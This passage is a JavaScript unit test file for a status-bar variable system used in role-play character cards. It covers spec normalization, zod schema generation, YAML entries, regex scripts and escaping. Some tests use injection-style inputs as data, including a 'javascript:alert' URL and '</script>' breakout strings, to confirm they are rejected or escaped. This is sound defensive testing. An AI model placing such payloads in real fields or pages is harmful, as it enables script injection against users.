// 状态栏 / MVU 变量系统：纯逻辑单元测试（变量表规范化、编译器、正则、角色脚本、界面检查、JSON Patch、运行时与预览）
// zod 与 yaml 是 devDependencies：没装（没跑 npm install）时相关用例自动跳过。
import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';

import {
    STATUS_TAG, ENTRY_COMMENTS, REGEX_NAMES, STATUS_BAR_IDS, StatusBarExportError,
    applyJsonPatch, applyReplyToState, buildInitialState, buildStatusRegexReplace, buildStatusRegexScripts, buildTavernHelper,
    cleanMacroText, compileInitVar, compileOutputFormat, compileSchemaScript, compileUpdateRules, countSpecLeaves,
    createStatusBar, decodeFenceText, encodeFenceText, ensureStatusBar, estimateStatusBarTokens, extractJsonPatch, htmlSafe, jsLit, jsStr,
    keepUpdateDepthToMinDepth, lintStatusHtml, normalizeStatusSpec, parseJsonPatchBlocks, parseStateWithSpec, showDepthToMaxDepth,
    simulateStRegexReplace, specSummaryText, statusBarActive, statusBarEntries, toYaml, unwrapStatusFence, uuidv4, withStatusTag,
    wrapStatusFence,
} from '../src/statusbar.js';
import {
    STATUS_BINDING_GUIDE, STATUSBAR_THEMES, buildNlRuntime, buildPreviewSrcdoc, cleanFragment, compileStatusDocument,
    renderDefaultFragment, runtimeSpec, simulateShownDocument,
} from '../src/statusbar-runtime.js';
import { BUILTIN_STATUSBAR_TEMPLATES } from '../src/statusbar-templates.js';
import { DEFAULT_SETTINGS, DEFAULT_STATUS_BAR } from '../src/constants.js';
import { mergeDefaults } from '../src/utils.js';

let z = null;
try {
    ({ z } = await import('zod'));
} catch { /* 未安装 */ }
let YAML = null;
try {
    YAML = (await import('yaml')).default;
} catch { /* 未安装 */ }
const needZod = { skip: z ? false : '需要 devDependency zod（npm install）' };
const needYaml = { skip: YAML ? false : '需要 devDependency yaml（npm install）' };

const RAW_SPEC = {
    title: '林小雨的状态',
    variables: [
        { path: '世界.时间', type: 'string', init: '2024年4月8日 10:45', format: 'YYYY年MM月DD日 HH:MM', label: '时间', widget: 'text', desc: '当前时间', check: ['每轮按剧情推进'] },
        { path: '林小雨.好感度', type: 'number', init: 30, min: 0, max: 100, integer: true, widget: 'bar', stages: [{ min: 40, label: '信任' }, { min: 0, label: '戒备' }], check: ['根据林小雨对{{user}}行为的感受调整', '单次变化 ±(1~5)'] },
        { path: '林小雨.心情', type: 'enum', options: ['平静', '开心', '低落'], init: '平静', widget: 'badge', check: ['随对话变化'] },
        { path: '林小雨.在场', type: 'boolean', init: true, widget: 'badge' },
        { path: '林小雨.状态', type: 'list', init: ['疲惫'], maxItems: 3, widget: 'tags' },
        { path: '主角.物品', type: 'record', keyDesc: '物品名', value: { type: 'object', fields: [{ key: '数量', type: 'number', min: 0, integer: true, init: 1 }, { key: '描述', type: 'string', init: '' }] }, init: { 旧钥匙: { 数量: 1, 描述: '生锈的"钥匙"' } }, widget: 'list', check: ['获得用 insert，失去用 remove'] },
        { path: '主角._回合', type: 'number', init: 0, widget: 'hidden' },
    ],
};

function spec() {
    return normalizeStatusSpec(RAW_SPEC, { charName: '林小雨' });
}

function card(extra = {}) {
    const c = { id: 'c1', kind: 'character', charName: '林小雨', timepoint: null, data: { name: '林小雨', first_mes: '雨停了。', alternate_greetings: ['另一个开场'], creator_notes: '' } };
    ensureStatusBar(c, { statusBar: DEFAULT_STATUS_BAR });
    c.statusBar.spec = spec();
    Object.assign(c.statusBar, extra);
    return c;
}

/** 把编译出的变量结构脚本变成真实的 zod Schema：去掉 import 行和 $(…) 注册行，注入 z */
function loadSchema(code) {
    const body = code.split('\n').filter((l) => !/^import\s/.test(l) && !/^\$\(/.test(l)).join('\n').replace('export const Schema', 'const Schema');
    return new Function('z', `${body}\nreturn Schema;`)(z);
}

/** 酒馆 public/scripts/utils.js:1387 regexFromString 的移植 */
function regexFromString(input) {
    const m = input.match(/(\/?)(.+)\1([a-z]*)/i);
    if (m[3] && !/^(?!.*?(.).*?\1)[gmixXsuUAJ]+$/.test(m[3])) return RegExp(input);
    return new RegExp(m[2], m[3]);
}

/** 酒馆 runRegexScript 的移植（替换串展开用 simulateStRegexReplace） */
function runScript(script, text) {
    return text.replace(regexFromString(script.findRegex), (...args) => simulateStRegexReplace(script.replaceString, { match: args[0], groups: args.slice(1, -2) }));
}

// fixMarkdown 里的空白字符集（源文件里不直接写不可见字符）
const MD_SPACE = ['\t', ' ', ...[0xa0, 0x1680, 0x2000, 0x2001, 0x2002, 0x2003, 0x2004, 0x2005, 0x2006, 0x2007, 0x2008, 0x2009, 0x200a, 0x202f, 0x205f, 0x3000, 0xfeff].map((c) => String.fromCharCode(c))].join('');
const MD_SPACE_AROUND = new RegExp(`(\\*|_)([${MD_SPACE}]+)|([${MD_SPACE}]+)(\\*|_)`, 'g');

/**
 * 酒馆 1.19 public/scripts/power-user.js:429 fixMarkdown 的移植。power_user.auto_fix_generated_markdown 默认开启，
 * script.js messageFormatting 在正则替换之后对整条消息（包括状态栏代码块）调用 fixMarkdown(mes, true)：
 * 删掉成对 * / _ 之间紧挨着它们的空白，并给 * 或 " 个数为奇数的行末尾补一个（注意它用的是原行，两个都奇数时只补 "）。
 */
function stFixMarkdown(text, forDisplay) {
    const format = /([*_]{1,2})([\s\S]*?)\1/gm;
    const matches = [];
    let match;
    while ((match = format.exec(text)) !== null) matches.push(match);
    let newText = text;
    for (let i = matches.length - 1; i >= 0; i--) {
        const matchText = matches[i][0];
        const replacementText = matchText.replace(MD_SPACE_AROUND, '$1$4');
        newText = newText.slice(0, matches[i].index) + replacementText + newText.slice(matches[i].index + matchText.length);
    }
    if (!forDisplay) return newText;
    const splitText = newText.split('\n');
    for (let index = 0; index < splitText.length; index++) {
        const line = splitText[index];
        for (const char of ['*', '"']) {
            if (line.includes(char) && (line.split(char).length - 1) % 2 === 1) splitText[index] = line.trimEnd() + char;
        }
    }
    return splitText.join('\n');
}

/** 浏览器解析 HTML 文本时的实体解码（测试用的独立实现，只认这里用得到的几种） */
function htmlTextDecode(html) {
    const named = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'" };
    return html.replace(/&(?:#(\d+)|#[xX]([0-9a-fA-F]+)|(amp|lt|gt|quot|apos));/g, (m, dec, hex, name) => (name ? named[name] : String.fromCodePoint(dec ? Number(dec) : parseInt(hex, 16))));
}

/**
 * 酒馆显示一条消息时对其中 ```代码块``` 的处理，加上酒馆助手取代码的方式，得到 iframe 实际收到的文本：
 * showdown 的 encodeCode 把 & < > 转义 → messageFormatting 把 <code> 里的 &amp; 换回 & → 酒馆助手 $pre.find('code').text()（浏览器解码实体）
 */
function stIframeText(message) {
    const m = message.match(/```[^\n]*\n([\s\S]*?)\n```/);
    assert.ok(m, '消息里应有代码块');
    const showdown = m[1].replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const st = showdown.replace(/&amp;/g, '&');
    return htmlTextDecode(st);
}

function scriptsOf(html) {
    return [...html.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script\s*>/gi)].map((m) => m[1]);
}

function previewBody(srcdoc) {
    return srcdoc.slice(srcdoc.indexOf('\n<body>\n') + '\n<body>\n'.length, srcdoc.lastIndexOf('\n</body>\n</html>'));
}

// ---------------- 规范化 ----------------

test('normalizeStatusSpec：类型/初始值规整、阶段排序、只读与隐藏变量', () => {
    const s = spec();
    assert.equal(s.title, '林小雨的状态');
    assert.equal(s.variables.length, 7);
    const fav = s.variables.find((v) => v.path === '林小雨.好感度');
    assert.deepEqual(fav.stages, [{ min: 0, label: '戒备' }, { min: 40, label: '信任' }], '阶段按 min 升序');
    assert.equal(fav.integer, true);
    assert.equal(fav.check[0], '根据林小雨对{{user}}行为的感受调整', '{{user}} 保留');
    const items = s.variables.find((v) => v.path === '主角.物品');
    assert.equal(items.value.type, 'object');
    assert.deepEqual(items.init, { 旧钥匙: { 数量: 1, 描述: '生锈的"钥匙"' } });
    assert.equal(countSpecLeaves(s), 8, '记录的对象值按字段数计');
    assert.match(specSummaryText(s), /林小雨\.好感度（数字，0~100，整数，阶段 0\+戒备\/40\+信任/);
});

test('normalizeStatusSpec：坏路径、保留名、重复、分组冲突、{{user}}/{{char}} 路径、层级上限', () => {
    const warnings = [];
    const s = normalizeStatusSpec({
        variables: [
            { path: '{{user}}.金钱', type: 'number', init: 5 },
            { path: '<user>.金钱', type: 'number', init: 6 },
            { path: '{{char}}.心情', type: 'string', init: '好' },
            { path: 'a/b', type: 'string' },
            { path: 'stat_data.x.y', type: 'string' },
            { path: 'x.stat_data', type: 'string' },
            { path: '坏 路径', type: 'string' },
            { path: '物品.0', type: 'string' },
            { path: 'a.b.c.d', type: 'string' },
            { path: '引号"', type: 'string' },
            { path: 'a.b', type: 'string' },
            { path: 'a.b.c', type: 'string' },
            { path: 'x', type: 'string' },
            { path: '$1级', type: 'string' },
            { path: '__proto__.x', type: 'string' },
            { path: '', type: 'string' },
        ],
    }, { charName: '莉莉丝', warnings });
    assert.deepEqual(s.variables.map((v) => v.path), ['主角.金钱', '莉莉丝.心情', 'a.b', 'x.y']);
    assert.equal(s.variables.find((v) => v.path === 'x.y').type, 'string', 'stat_data. 前缀与 / 分隔都被规整');
    assert.ok(warnings.some((w) => w.includes('重复')));
    assert.ok(warnings.some((w) => w.includes('保留名')));
    assert.ok(warnings.some((w) => w.includes('冲突')));
    assert.ok(warnings.some((w) => w.includes('层级超过')));
    assert.ok(warnings.some((w) => w.includes('纯数字')));
    assert.ok(warnings.some((w) => w.includes('含有空白')));
    assert.ok(warnings.some((w) => w.includes('$数字')));
});

test('normalizeStatusSpec：初始值强制转换与夹取、枚举兜底、类型推断、叶子上限', () => {
    const warnings = [];
    const s = normalizeStatusSpec([
        { path: 'a.n', type: 'integer', init: '150', min: 0, max: 100 },
        { path: 'a.f', init: 2.6, min: 0, max: 5 },
        { path: 'a.e', type: 'enum', options: '甲|乙|丙', init: '丁' },
        { path: 'a.e2', type: 'enum', options: [] },
        { path: 'a.b', type: 'bool', init: '是' },
        { path: 'a.l', type: 'list', init: '一、二、三、四', maxItems: 2 },
        { path: 'a.r', type: 'record', value: 'number', init: ['剑', '盾'] },
        { path: 'a.s', init: { 嵌套: 1 } },
        { path: 'b.x', type: 'string', init: '含{{random::a::b}}宏和{{char}}', widget: 'bar' },
        { path: 'c.1', type: 'string' },
        { path: 'c.over', type: 'string' },
    ], { maxVars: 9, warnings });
    const by = Object.fromEntries(s.variables.map((v) => [v.path, v]));
    assert.equal(by['a.n'].init, 100);
    assert.equal(by['a.n'].integer, true);
    assert.equal(by['a.f'].type, 'number');
    assert.equal(by['a.f'].integer, false);
    assert.equal(by['a.f'].init, 2.6);
    assert.deepEqual(by['a.e'].options, ['甲', '乙', '丙']);
    assert.equal(by['a.e'].init, '甲', '不在选项里的初始值改为第一个选项');
    assert.equal(by['a.e2'].type, 'string', '没有选项的枚举改为文本');
    assert.equal(by['a.b'].init, true);
    assert.deepEqual(by['a.l'].init, ['三', '四'], '列表只保留最后 maxItems 项');
    assert.deepEqual(by['a.r'].init, { 剑: 1, 盾: 1 }, '数组形式的记录初始值转成键');
    assert.equal(by['a.s'].type, 'record');
    assert.equal(by['b.x'].init, '含宏和{{char}}', '只保留 {{user}}/{{char}}');
    assert.equal(by['b.x'].widget, 'text', '文本不能用进度条');
    assert.ok(!by['c.over'], '超过上限的变量被丢弃');
    assert.ok(warnings.some((w) => w.includes('上限 9')));
    assert.equal(cleanMacroText('a{{ USER }}b{{x}}c{{'), 'a{{user}}bc');
});

test('normalizeStatusSpec：min 大于 max 被对调、初始值超出范围被夹取时都写进 warnings', () => {
    const warnings = [];
    const s = normalizeStatusSpec([
        { path: '甲.反', type: 'number', min: 100, max: 0, init: 50 },
        { path: '甲.超', type: 'integer', min: 0, max: 100, init: 150 },
        { path: '甲.低', type: 'number', min: 10, init: -3 },
        { path: '甲.正常', type: 'number', min: 0, max: 10, init: 2.6, integer: true },
        { path: '甲.缺省', type: 'number', min: 5, max: 9 },
        { path: '甲.属性', type: 'record', value: { type: 'number', min: 0, max: 10, init: 20 }, init: { 力量: 30, 敏捷: 5 } },
        { path: '甲.背包', type: 'record', value: { type: 'object', fields: [{ key: '数量', type: 'number', min: 5, max: 1, init: 9 }] }, init: { 火把: { 数量: -2 }, 绳子: {} } },
    ], { maxVars: 30, warnings });
    const by = Object.fromEntries(s.variables.map((v) => [v.path, v]));
    assert.deepEqual([by['甲.反'].min, by['甲.反'].max, by['甲.反'].init], [0, 100, 50]);
    assert.equal(by['甲.超'].init, 100);
    assert.equal(by['甲.低'].init, 10);
    assert.equal(by['甲.正常'].init, 3, '取整不算超出范围');
    assert.equal(by['甲.缺省'].init, 5, '没给初始值时取范围内的默认值，不提示');
    assert.equal(by['甲.属性'].value.init, 10);
    assert.deepEqual(by['甲.属性'].init, { 力量: 10, 敏捷: 5 });
    assert.deepEqual(by['甲.背包'].value.fields[0], { key: '数量', type: 'number', min: 1, max: 5, integer: true, init: 5 });
    assert.deepEqual(by['甲.背包'].init, { 火把: { 数量: 1 }, 绳子: { 数量: 5 } });
    const text = warnings.join('\n');
    assert.match(text, /变量「甲\.反」 的最小值 100 大于最大值 0，已对调成 0~100/);
    assert.match(text, /变量「甲\.超」 的初始值 150 超出范围 0~100，已改为 100/);
    assert.match(text, /变量「甲\.低」 的初始值 -3 超出范围 ≥10，已改为 10/);
    assert.match(text, /变量「甲\.属性」 的记录值 的初始值 20 超出范围 0~10，已改为 10/);
    assert.match(text, /变量「甲\.属性」 的初始条目「力量」 的初始值 30 超出范围 0~10，已改为 10/);
    assert.match(text, /变量「甲\.背包」 的字段「数量」 的最小值 5 大于最大值 1/);
    assert.match(text, /变量「甲\.背包」 的字段「数量」 的初始值 9 超出范围 1~5，已改为 5/);
    assert.match(text, /变量「甲\.背包」 的初始条目「火把」的「数量」 的初始值 -2 超出范围 1~5，已改为 1/);
    assert.ok(!/甲\.正常|甲\.缺省|敏捷|绳子/.test(text), text);
    assert.equal(warnings.length, 8);
    // 规范化后的结果再规范化一次不再有提示
    const again = [];
    assert.deepEqual(normalizeStatusSpec(s, { maxVars: 30, warnings: again }), s);
    assert.deepEqual(again, []);
});

// ---------------- 安全转义 ----------------

test('jsStr / jsLit：转义 < > $ { } 反引号，不产生 </script、{{、$1', () => {
    const s = jsStr('</script>{{user}}$1`x`');
    assert.ok(!s.includes('</script'));
    assert.ok(!s.includes('{{'));
    assert.ok(!/\$\d/.test(s));
    assert.ok(!s.includes('`'));
    assert.equal(JSON.parse(s), '</script>{{user}}$1`x`', '仍是合法 JSON，值不变');
    const o = jsLit({ a: { b: ['}}', '<x>'] } });
    assert.deepEqual(JSON.parse(o), { a: { b: ['}}', '<x>'] } });
    assert.ok(!o.includes('{{'));
    // 字符串里的 * 与 " 也转义：整段字面量里 * 的个数为 0、" 的个数为偶数（酒馆的「自动修复 Markdown」不会动它）
    const q = jsLit({ 'k"*': ['a"b', '星*号', '\\"', 'x\\', '"'] });
    assert.deepEqual(JSON.parse(q), { 'k"*': ['a"b', '星*号', '\\"', 'x\\', '"'] });
    assert.ok(!q.includes('*'), q);
    assert.equal((q.split('"').length - 1) % 2, 0, q);
    assert.ok(q.includes('\\u0022') && q.includes('\\u002a'));
    assert.equal(htmlSafe('a*b"c'), 'a&#42;b&quot;c');
});

test('decodeFenceText / encodeFenceText：只解一层实体，是彼此的逆操作', () => {
    assert.equal(encodeFenceText('a && b &lt; c &amp;'), 'a &amp;&amp; b &amp;lt; c &amp;amp;');
    assert.equal(decodeFenceText('&amp;lt; &lt;b&gt; &#36;1 &#x7b;&#X7D; &quot;&apos; &nbsp;|&unknown; &#0; & &amp'), `&lt; <b> $1 {} "' ${String.fromCharCode(0xa0)}|&unknown; ${String.fromCharCode(0xfffd)} & &amp`);
    for (const s of ['', 'a && b', '&amp;&lt;&#36;', '<b title="&quot;">x</b>', '&&amp;;&']) assert.equal(decodeFenceText(encodeFenceText(s)), s, s);
});

// ---------------- 变量结构脚本 ----------------

test('compileSchemaScript：结构快照、无 </script、CDN 地址', () => {
    const code = compileSchemaScript(spec(), { zodUrl: 'https://example.com/mvu_zod.js' });
    assert.ok(code.startsWith('// 由 NovelLoom 生成'));
    assert.ok(code.includes('import { registerMvuSchema } from "https://example.com/mvu_zod.js";'));
    assert.ok(code.includes('"好感度": z.coerce.number().prefault(30).transform(v => Math.min(100, Math.max(0, Math.round(v)))),'));
    assert.ok(code.includes('"心情": z.enum(["平静","开心","低落"]).prefault("平静"),'));
    assert.ok(code.includes('"在场": nlBool().prefault(true),'));
    assert.ok(code.includes('"状态": z.array(nlStr()).prefault(["疲惫"]).transform(a => a.slice(-3)),'));
    assert.ok(code.includes('z.record(z.string().describe("物品名"), z.object({'));
    assert.ok(code.includes('}).prefault({}),'));
    assert.ok(code.trimEnd().endsWith('$(() => { registerMvuSchema(Schema); });'));
    assert.ok(!/<\/script/i.test(code));
    assert.ok(!code.includes('_.'), '不依赖 lodash');
    // 非法地址回退到默认
    assert.ok(compileSchemaScript(spec(), { zodUrl: "javascript:alert('x')" }).includes(DEFAULT_STATUS_BAR.zodUrl));
    // 键名里的 < 被转义
    const tricky = compileSchemaScript(normalizeStatusSpec([{ path: '甲.乙', type: 'string', init: '</script><b>' }]));
    assert.ok(!/<\/script/i.test(tricky));
});

test('compileSchemaScript + 真实 zod：parse({}) 等于初始值、幂等、夹取、拒绝非法选项', needZod, () => {
    const s = spec();
    const Schema = loadSchema(compileSchemaScript(s));
    const init = buildInitialState(s);
    const a = Schema.parse({});
    assert.deepEqual(a, init);
    assert.deepEqual(Schema.parse(a), a, '幂等');
    const b = Schema.parse({ 林小雨: { 好感度: '150.4', 在场: 'false', 状态: ['a', 'b', 'c', 'd', 5] }, 主角: { 物品: { 绳子: { 数量: 2.7, 多余: 1 } } } });
    assert.equal(b.林小雨.好感度, 100);
    assert.equal(b.林小雨.在场, false);
    assert.deepEqual(b.林小雨.状态, ['b', 'c', 'd', '5'].slice(-3));
    assert.deepEqual(b.主角.物品, { 绳子: { 数量: 3, 描述: '' } }, '记录值补默认字段、丢弃未知字段');
    assert.deepEqual(Schema.parse(b), b, '幂等');
    assert.equal(Schema.safeParse({ 林小雨: { 心情: '狂喜' } }).success, false, '非法选项被拒绝');
    assert.equal(Schema.safeParse({ 林小雨: { 好感度: 'abc' } }).success, false);
    assert.equal(Schema.safeParse({ 林小雨: { 在场: 'maybe' } }).success, false);
    assert.equal(Schema.safeParse({ 主角: { 物品: ['x'] } }).success, false);
});

test('parseStateWithSpec 与真实 zod（registerMvuSchema 的宽松顶层）结果一致', needZod, () => {
    const s = spec();
    const Schema = loadSchema(compileSchemaScript(s));
    const Loose = z.looseObject(Schema.shape);
    const inputs = [
        {},
        { 额外: { 保留: true }, 林小雨: { 好感度: -3, 心情: '开心', 未知: 1 } },
        { 林小雨: { 好感度: true, 状态: [] }, 世界: { 时间: 1234 } },
        { 主角: { 物品: { 刀: {}, 盾: { 数量: '4', 描述: 9 } }, _回合: '2' } },
        { 林小雨: { 心情: '狂喜' } },
        { 林小雨: null },
        { 林小雨: { 好感度: 'Infinity' } },
        { 主角: { 物品: { 刀: { 数量: 'x' } } } },
        { 林小雨: { 状态: [{ a: 1 }] } },
    ];
    for (const input of inputs) {
        const zr = Loose.safeParse(structuredClone(input));
        const mine = parseStateWithSpec(s, structuredClone(input));
        assert.equal(mine.ok, zr.success, JSON.stringify(input));
        if (zr.success) assert.deepEqual(mine.data, zr.data, JSON.stringify(input));
    }
});

// ---------------- YAML 条目 ----------------

test('compileInitVar：YAML 往返，键必要时加引号', needYaml, () => {
    const s = spec();
    const text = compileInitVar(s);
    assert.ok(!text.includes('stat_data'));
    assert.deepEqual(YAML.parse(text), buildInitialState(s));
    const odd = { true: 1, 123: 'x', 'a:b': ['x', '"引号"\n换行'], $阶段: { '#注释': null, 空: {}, 列表: [] }, 'yes': false, '-1': 0.5, 宏: '{{user}}的东西' };
    assert.deepEqual(YAML.parse(toYaml(odd)), odd);
});

test('compileUpdateRules：根键、范围/选项/类型/检查规则，只读变量不列出', needYaml, () => {
    const text = compileUpdateRules(spec());
    const y = YAML.parse(text);
    const r = y.变量更新规则;
    assert.ok(r);
    assert.equal(r.林小雨.好感度.type, 'integer');
    assert.equal(r.林小雨.好感度.range, '0~100');
    assert.deepEqual(r.林小雨.好感度.check, ['根据林小雨对{{user}}行为的感受调整', '单次变化 ±(1~5)']);
    assert.deepEqual(r.林小雨.心情.options, ['平静', '开心', '低落']);
    assert.equal(r.林小雨.在场.type, 'boolean');
    assert.equal(r.林小雨.状态.type, 'string[]');
    assert.equal(r.林小雨.状态.maxItems, 3);
    assert.equal(r.世界.时间.format, 'YYYY年MM月DD日 HH:MM');
    assert.equal(r.世界.时间.desc, '当前时间');
    assert.match(r.主角.物品.type, /\[物品名: string\]: \{\n {4}数量: number; \/\/ >=0\n {4}描述: string;/);
    assert.ok(!('_回合' in r.主角), '_ 开头的只读变量不列出');
});

test('compileOutputFormat：合法 YAML、英文/中文 Analysis、五种操作', needYaml, () => {
    const en = compileOutputFormat({ analysisLang: 'en' });
    const zh = compileOutputFormat({ analysisLang: 'zh' });
    const y = YAML.parse(en);
    assert.ok(y.变量输出格式.规则.length >= 8);
    assert.match(y.变量输出格式.格式, /^<UpdateVariable>\n<Analysis>\(IN ENGLISH, no more than 80 words\)/);
    assert.match(y.变量输出格式.格式, /<JSONPatch>[\s\S]*"op": "delta"[\s\S]*"op": "move", "from"[\s\S]*<\/JSONPatch>\n<\/UpdateVariable>$/);
    assert.match(YAML.parse(zh).变量输出格式.格式, /用中文写/);
    for (const t of [en, zh]) {
        assert.ok(!t.includes('{{'));
        for (const op of ['replace', 'delta', 'insert', 'remove', 'move']) assert.ok(t.includes(op));
        assert.ok(t.includes('/-'));
        assert.ok(t.includes('stat_data'));
    }
});

test('statusBarEntries：四个条目的备注、开关、位置、预算与覆盖文本', () => {
    const c = card();
    const es = statusBarEntries(c);
    assert.deepEqual(es.map((e) => e.comment), [ENTRY_COMMENTS.initvar, ENTRY_COMMENTS.list, ENTRY_COMMENTS.rules, ENTRY_COMMENTS.format]);
    assert.deepEqual(es.map((e) => e.comment), ['[initvar]变量初始化勿开', '变量列表', '[mvu_update]变量更新规则', '[mvu_update]变量输出格式']);
    const [init, list, rules, format] = es;
    assert.equal(init.disable, true);
    assert.equal(init.position, 0);
    assert.equal(init.ignoreBudget, false);
    for (const e of [list, rules, format]) {
        assert.equal(e.disable, false);
        assert.equal(e.position, 4);
        assert.equal(e.depth, 0);
        assert.equal(e.role, 0);
        assert.equal(e.ignoreBudget, true);
    }
    for (const e of es) {
        assert.deepEqual(e.keywords, []);
        assert.equal(e.constant, true);
        assert.equal(e.order, 14720);
        assert.equal(e.excludeRecursion, true);
        assert.equal(e.preventRecursion, true);
    }
    assert.equal(list.content, '---\n<status_current_variable>\n{{format_message_variable::stat_data}}\n</status_current_variable>');
    assert.equal(init.content, compileInitVar(c.statusBar.spec));
    c.statusBar.overrides = { initvar: 'a: 1', updateRules: '变量更新规则: {}', schemaScript: null };
    c.statusBar.options.analysisLang = 'zh';
    const es2 = statusBarEntries(c);
    assert.equal(es2[0].content, 'a: 1');
    assert.equal(es2[2].content, '变量更新规则: {}');
    assert.match(es2[3].content, /用中文写/);
    const tok = estimateStatusBarTokens(c);
    assert.ok(tok.list > 0 && tok.rules > 0 && tok.format > 0 && tok.total === tok.list + tok.rules + tok.format);
});

// ---------------- 正则 ----------------

test('显示层数 → maxDepth、保留更新块 → minDepth（按酒馆的深度计算）', () => {
    assert.equal(showDepthToMaxDepth(1), 1);
    assert.equal(showDepthToMaxDepth(3), 5);
    assert.equal(showDepthToMaxDepth(null), null);
    assert.equal(showDepthToMaxDepth(0), null);
    assert.equal(showDepthToMaxDepth('2'), 3);
    assert.equal(keepUpdateDepthToMinDepth(null), null);
    assert.equal(keepUpdateDepthToMinDepth(1), 2);
    assert.equal(keepUpdateDepthToMinDepth(3), 6);
    // 模拟酒馆 messageFormatting 的深度：AI/用户交替，最新消息深度 0；engine.js 在 depth > maxDepth 时跳过
    const visible = (chatLen, maxDepth) => {
        const out = [];
        for (let i = 0; i < chatLen; i++) {
            const depth = chatLen - i - 1;
            const isAi = i % 2 === 0; // 0 号是开场白
            if (isAi && !(maxDepth !== null && depth > maxDepth)) out.push(i);
        }
        return out;
    };
    assert.deepEqual(visible(5, showDepthToMaxDepth(1)), [4], '最新是 AI 回复：只显示它');
    assert.deepEqual(visible(6, showDepthToMaxDepth(1)), [4], '用户刚发言：上一条 AI 回复仍显示');
    assert.deepEqual(visible(7, showDepthToMaxDepth(2)), [4, 6]);
    assert.deepEqual(visible(4, showDepthToMaxDepth(null)), [0, 2]);
});

test('buildStatusRegexScripts：字段集、标志、id、替换串往返；折叠关闭时只有三条', () => {
    const c = card({ mode: 'auto' });
    const rs = buildStatusRegexScripts(c);
    assert.equal(rs.length, 5);
    const keys = ['id', 'scriptName', 'findRegex', 'replaceString', 'trimStrings', 'placement', 'disabled', 'markdownOnly', 'promptOnly', 'runOnEdit', 'substituteRegex', 'minDepth', 'maxDepth'];
    for (const r of rs) {
        assert.deepEqual(Object.keys(r).sort(), [...keys].sort());
        assert.deepEqual(r.trimStrings, []);
        assert.equal(r.disabled, false);
        assert.equal(r.substituteRegex, 0);
        assert.match(r.id, /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
        assert.ok(regexFromString(r.findRegex) instanceof RegExp);
    }
    const [bar, hide, strip, foldIng, foldDone] = rs;
    assert.deepEqual(rs.map((r) => r.scriptName), [REGEX_NAMES.bar, REGEX_NAMES.hideTag, REGEX_NAMES.strip, REGEX_NAMES.foldStreaming, REGEX_NAMES.foldDone]);
    assert.deepEqual(rs.map((r) => r.id), [c.statusBar.ids.regexBar, c.statusBar.ids.regexHideTag, c.statusBar.ids.regexStrip, c.statusBar.ids.regexFoldStreaming, c.statusBar.ids.regexFoldDone]);
    assert.equal(bar.findRegex, STATUS_TAG);
    assert.deepEqual(bar.placement, [2]);
    assert.equal(bar.markdownOnly, true);
    assert.equal(bar.promptOnly, false);
    assert.equal(bar.runOnEdit, true);
    assert.equal(bar.maxDepth, 1);
    assert.equal(bar.minDepth, null);
    assert.ok(bar.replaceString.startsWith('\n```html\n'));
    assert.ok(bar.replaceString.endsWith('\n```\n'));
    assert.ok(bar.replaceString.includes('<body'));
    assert.equal(simulateStRegexReplace(bar.replaceString, { match: STATUS_TAG }), bar.replaceString, '酒馆替换展开后与原串一致');
    assert.equal(hide.promptOnly, true);
    assert.equal(hide.markdownOnly, false);
    assert.deepEqual(hide.placement, [2]);
    assert.deepEqual(strip.placement, [1, 2]);
    assert.equal(strip.promptOnly, true);
    assert.equal(strip.minDepth, null);
    for (const f of [foldIng, foldDone]) {
        assert.equal(f.markdownOnly, true);
        assert.deepEqual(f.placement, [1, 2]);
    }
    // 行为：在一条 AI 回复上跑这些正则
    const reply = `正文。\n<UpdateVariable>\n<Analysis>x</Analysis>\n<JSONPatch>[]</JSONPatch>\n</UpdateVariable>\n\n${STATUS_TAG}`;
    const shown = runScript(bar, runScript(foldDone, reply));
    assert.ok(shown.includes('<details>\n<summary>变量更新</summary>\n<Analysis>x</Analysis>'));
    assert.ok(shown.includes('```html\n<!doctype html>'));
    const prompt = runScript(hide, runScript(strip, reply));
    assert.equal(prompt, '正文。', '提示词里去掉更新块与占位符');
    const streaming = runScript(foldIng, '正文\n<UpdateVariable>\n<Analysis>还没写完');
    assert.ok(streaming.includes('<summary>变量更新中…</summary>\n<Analysis>还没写完'));

    c.statusBar.options = { ...c.statusBar.options, foldUpdate: false, showDepth: null, keepUpdateDepth: 2 };
    const rs2 = buildStatusRegexScripts(c);
    assert.equal(rs2.length, 3);
    assert.equal(rs2[0].maxDepth, null);
    assert.equal(rs2[2].minDepth, 4);
});

test('buildStatusRegexReplace：$1、{{宏}}、<user>、``` 都会被拒绝', () => {
    const ok = buildStatusRegexReplace('<body>{{user}} 与 {{char}} $(function(){})</body>');
    assert.ok(ok.includes('{{user}}'));
    for (const bad of ['<body>$1</body>', '<body>$<name></body>', '<body>{{random::a::b}}</body>', '<body><user></body>', '<body>{{match}}</body>', '<body>```</body>', '<div>没有 body</div>', '<body><script>/a\\{2\\}/</script></body>']) {
        assert.throws(() => buildStatusRegexReplace(bad), StatusBarExportError, bad);
    }
});

test('状态栏正则：& 先写成 &amp;，酒馆解码一层实体后 iframe 收到的正是原文档', () => {
    const doc = '<body><b title="a &quot;b&quot;">x &lt; y &amp;&amp; z &#36;</b><script>var ok = 1 && 2; var s = "&lt;/b&gt;";</script></body>';
    const replace = buildStatusRegexReplace(doc);
    assert.ok(replace.startsWith('\n```html\n') && replace.endsWith('\n```\n'));
    assert.ok(replace.includes('&amp;lt;') && replace.includes('1 &amp;&amp; 2') && replace.includes('&amp;quot;'));
    assert.equal(simulateStRegexReplace(replace, { match: STATUS_TAG }), replace, '往返检查仍针对写进卡里的替换串');
    assert.equal(decodeFenceText(unwrapStatusFence(replace)), doc);
    assert.equal(stIframeText(`正文。\n\n${replace}`), doc, '模拟酒馆 + 酒馆助手：iframe 收到原文档');
    assert.notEqual(stIframeText(`正文。\n\n${wrapStatusFence(doc)}`), doc, '不先转义（旧做法）时 iframe 收到的是被解码过的文本');
    // 内置排版里经 htmlSafe 转义的标签，到 iframe 里仍是文字而不是标记
    const c = card({ mode: 'auto' });
    c.statusBar.spec = normalizeStatusSpec({ variables: [{ path: '甲.乙', label: '<i>斜</i>&', type: 'string', init: '' }] });
    const shown = stIframeText(`正文\n\n${buildStatusRegexScripts(c)[0].replaceString}`);
    assert.equal(shown, compileStatusDocument(c));
